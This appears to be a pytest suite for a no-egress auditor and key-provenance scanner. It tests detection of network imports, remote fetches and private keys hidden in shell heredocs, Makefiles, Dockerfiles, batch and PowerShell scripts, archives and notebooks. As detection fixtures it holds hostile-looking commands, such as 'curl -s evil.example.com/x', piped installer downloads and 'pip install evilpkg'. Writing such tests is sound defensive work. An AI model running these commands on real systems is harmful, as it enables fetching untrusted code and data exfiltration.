"""JavaScript text that is not code, Python a shell hands over in every common shape, the continuation character of
each dialect, archives by their bytes, and a signed subject bound to the body. Each test asserts both halves: the
false thing is gone, the true neighbour stays."""
from __future__ import annotations

import bz2
import gzip
import io
import json
import lzma
import zipfile
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import key_provenance
from entrovouch.no_egress_auditor import (
    _sign, audit, canonical_body, report_problem, subject_matches, verify_report,
)
from entrovouch.signer import MerkleSigner

PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n" * 4
       + "-----END RSA PRIVATE KEY-----\n")


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def _kinds(root: Path, name: str | None = None) -> list[tuple[int, str]]:
    return [(f["line"], f["kind"]) for f in audit(root, label="t").findings if name is None or f["file"] == name]


# ---------------------------------------------------------------- JavaScript: an apostrophe is not a string
@pytest.mark.parametrize("name", ["Banner.jsx", "Banner.tsx"])
def test_an_apostrophe_in_jsx_text_hides_no_code(tmp_path, name):
    _write(tmp_path, name, "export function Banner() {\n  return <p>Don't miss out</p>;\n}\n"
                           "export async function load(url) {\n  const r = await fetch(url);\n"
                           "  const axios = require(\"axios\");\n  return r;\n}\nconst done = 'ok';\n")
    found = _kinds(tmp_path)
    assert (6, "network-import") in found and (5, "network-call") in found


def test_a_quote_in_a_regex_after_a_condition_hides_no_code(tmp_path):
    _write(tmp_path, "r.js", "if (ok) /'/.test(s); const h = require('https');\n"
                             "const s = 'a // not a comment, and not code: require(\"net\")';\n"
                             "function f() { return'x'; }\n")
    assert _kinds(tmp_path) == [(1, "network-import")]


# ---------------------------------------------------------------- Python a shell hands over
def test_every_common_shape_of_python_on_standard_input_is_read(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        "python3 - \"$URL\" <<'EOF'", "import requests", "EOF",
        "python3 /dev/stdin <<'EOF'", "import ftplib", "EOF",
        "uv run --with httpx python - <<'EOF'", "import smtplib", "EOF",
        "python3 -- - <<'EOF'", "import telnetlib", "EOF",
        "python3 -c \"$(cat <<'EOF'", "import socket", "EOF", ")\"",
        "python3 - <<'END-PY'", "import xmlrpc.client", "END-PY",
        "python3 tool.py <<EOF", "import paramiko", "EOF",        # the script reads this as data: not Python
    ]) + "\n")
    lines = {line for line, kind in _kinds(tmp_path) if kind == "network-import"}
    assert lines == {2, 5, 8, 11, 14, 18}


def test_python_with_a_command_substitution_is_read_as_both(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        "python3 <<EOF", "# fetch the `latest` release", "import requests", "EOF",
        "python3 -c \"import requests; print(requests.get('$(curl -s x)').text)\"",
    ]) + "\n")
    found = _kinds(tmp_path)
    assert (3, "network-import") in found and (5, "network-import") in found and (5, "script-network-command") in found


def test_make_shell_function_inside_python_c_runs(tmp_path):
    _write(tmp_path, "Makefile", "docs:\n\tpython3 -c \"print('$(shell curl -s evil.example.com/x)')\"\n")
    assert _kinds(tmp_path) == [(2, "script-network-command")]


def test_a_long_environment_prefix_is_still_a_prefix(tmp_path):
    prefix = "PYTHONPATH=" + ":".join(f"/opt/lib{k}" for k in range(250))
    _write(tmp_path, "a.sh", f"{prefix} python3 -c 'import socket; socket.create_connection((\"h\", 1))'\n"
                             f"{prefix} curl -fsSL https://x.example/i.sh\n")
    assert _kinds(tmp_path) == [(1, "network-import"), (1, "network-call"), (2, "script-network-command")]


def test_heredocs_to_su_chroot_and_a_variable_shell_run_commands(tmp_path):
    _write(tmp_path, "a.sh", "su - app <<'EOF'\ngit pull\nEOF\narch-chroot /mnt <<'EOF'\npip install x\nEOF\n"
                             "\"$SHELL\" <<'EOF'\nwget https://x.example/y\nEOF\ncat <<'EOF'\ncurl is a tool\nEOF\n")
    assert [line for line, _ in _kinds(tmp_path)] == [2, 5, 8]


# ---------------------------------------------------------------- the continuation character of each dialect
def test_a_windows_dockerfile_escape_directive(tmp_path):
    _write(tmp_path, "Dockerfile", "# escape=`\nFROM mcr.microsoft.com/windows/servercore:ltsc2022\nWORKDIR C:\\\n"
                                   "RUN python -c \"import socket; socket.create_connection(('h',1))\"\n"
                                   "WORKDIR C:\\app\\\nRUN pip install evilpkg\n"
                                   "RUN powershell -Command `\n    Invoke-WebRequest https://x.example/x -OutFile x\n")
    found = _kinds(tmp_path)
    assert (4, "network-import") in found and (6, "script-network-command") in found \
        and (7, "script-network-command") in found


def test_cmd_and_powershell_continue_lines_with_their_own_character(tmp_path):
    (tmp_path / "a.bat").write_bytes(b"echo one ^\r\n  curl https://x.example/a\r\ncmd /c curl https://x.example/q\r\n")
    _write(tmp_path, "b.ps1", "Write-Host a `\n  ; Invoke-WebRequest https://x.example/b\n"
                              "Get-Item C:\\work\\\nInvoke-WebRequest https://x.example/c\n")
    assert _kinds(tmp_path, "a.bat") == [(1, "external-url"), (3, "script-network-command")]
    assert _kinds(tmp_path, "b.ps1") == [(1, "script-network-command"), (4, "script-network-command")]


# ---------------------------------------------------------------- keys in containers and in notebook cells
def test_keys_inside_archives_are_found_by_their_bytes(tmp_path):
    for name in ("app.war", "handover.docx"):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("WEB-INF/key.pem", PEM)
        (tmp_path / name).write_bytes(buf.getvalue())
    (tmp_path / "k.pem.gz").write_bytes(gzip.compress(PEM.encode()))
    (tmp_path / "k.bz2").write_bytes(bz2.compress(PEM.encode()))
    (tmp_path / "k.xz").write_bytes(lzma.compress(PEM.encode()))
    (tmp_path / "k.7z").write_bytes(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 20)
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    assert sorted(f["file"] for f in rep.findings) == ["app.war", "handover.docx", "k.bz2", "k.pem.gz", "k.xz"]
    assert rep.not_scanned["archives_not_opened"] == ["k.7z"]


def test_a_key_in_a_notebook_shell_or_html_cell_is_found(tmp_path):
    _write(tmp_path, "n.ipynb", json.dumps({"nbformat": 4, "cells": [
        {"cell_type": "code", "source": ["%%bash\n", "cat > ~/.ssh/id_rsa <<'EOF'\n", PEM, "EOF\n"]},
        {"cell_type": "code", "source": ["%%html\n", "<pre>", PEM, "</pre>\n"]},
        {"cell_type": "code", "source": ["x = 1\n"]}]}))
    found = key_provenance.scan_key_provenance(tmp_path, label="t").findings
    assert [f["line"] for f in found] == [1, 2]


# ---------------------------------------------------------------- the in-toto subject names the body's tree
def test_a_signed_subject_naming_another_artifact_is_refused(tmp_path):
    _write(tmp_path / "t", "a.py", "import requests\n")
    signer = MerkleSigner.create(tmp_path / "k.json", height=3)
    honest = asdict(audit(tmp_path / "t", label="L", signer=signer))
    assert subject_matches(honest) and verify_report(honest, expected_root=honest["public_root"])[0]
    other = dict(honest, subject=[{"name": "L", "digest": {"sha3-256": "0" * 64}}], signature={})
    other["content_hash"], other["integrity_tag"] = _sign(other)
    other["signature"] = signer.sign(canonical_body(other))
    assert verify_report(other, expected_root=honest["public_root"]) == (False, "TAMPERED")
    assert "in-toto subject" in report_problem(other)


# ---------------------------------------------------------------- one tree, one report: Unicode, line endings, checkouts
def test_link_text_is_decided_the_same_way_by_every_python(tmp_path):
    _write(tmp_path, "run.sh", "k\U00011F04/node_modules/x")       # a letter newer than some Unicode databases
    _write(tmp_path, "app.py", "x = 1\n")
    rep = audit(tmp_path, label="t")
    assert rep.not_scanned["symbolic_links"] == 0                  # not a path of ASCII path characters: read


def test_cython_source_gives_one_digest_for_either_line_ending(tmp_path):
    for name, nl in (("lf", "\n"), ("crlf", "\r\n")):
        (tmp_path / name).mkdir()
        (tmp_path / name / "fast.pyx").write_bytes(f"import requests{nl}cdef int x = 1{nl}".encode())
        (tmp_path / name / "m.pkl").write_bytes(f"(lp0{nl}I1{nl}a.".encode())
    a, b = audit(tmp_path / "lf", label="t"), audit(tmp_path / "crlf", label="t")
    assert (a.findings_digest, a.subject_digest) == (b.findings_digest, b.subject_digest)


def test_coverage_data_and_an_option_line_change_nothing(tmp_path):
    for name in ("fresh", "used"):
        _write(tmp_path / name, "requirements.txt", "-rdeps/net.txt")
        _write(tmp_path / name, "deps/net.txt", "stripe\n")
    _write(tmp_path / "used", ".coverage", "SQLite format 3")
    fresh, used = audit(tmp_path / "fresh", label="t"), audit(tmp_path / "used", label="t")
    assert fresh.findings_digest == used.findings_digest
    assert [f["kind"] for f in fresh.findings] == ["declared-network-dependency"]


def test_ansi_c_quoting_is_undone(tmp_path):
    _write(tmp_path, "a.sh", "python3 -c $'import socket\\nsocket.create_connection((\"h\",1))'\n"
                             "python3 -c $'x = \"\\U0011FFFF\"'\n")
    assert _kinds(tmp_path) == [(1, "network-import"), (1, "network-call")]
